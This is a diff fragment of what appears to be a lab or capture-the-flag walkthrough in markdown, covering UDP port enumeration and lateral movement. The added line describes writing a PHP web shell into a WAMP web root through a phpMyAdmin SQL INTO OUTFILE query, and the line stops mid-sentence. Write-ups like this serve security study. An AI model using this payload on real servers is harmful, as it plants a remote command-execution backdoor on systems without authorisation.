@@ -120,7 +120,7 @@ Enumerated top 200 UDP ports:
 
 ![](Pasted%20image%2020221027005654.png)
 
- 
+ #### - Googled "phpmyadmin mysql root login exploit" and found the following webpage showing to click the SQL  link. I then typed SELECT "<?php system($_GET['cmd']); ?>"  INTO OUTFILE 'C:/wamp/www/cmd.php' and go
 ---
 
 # Lateral Movement to user
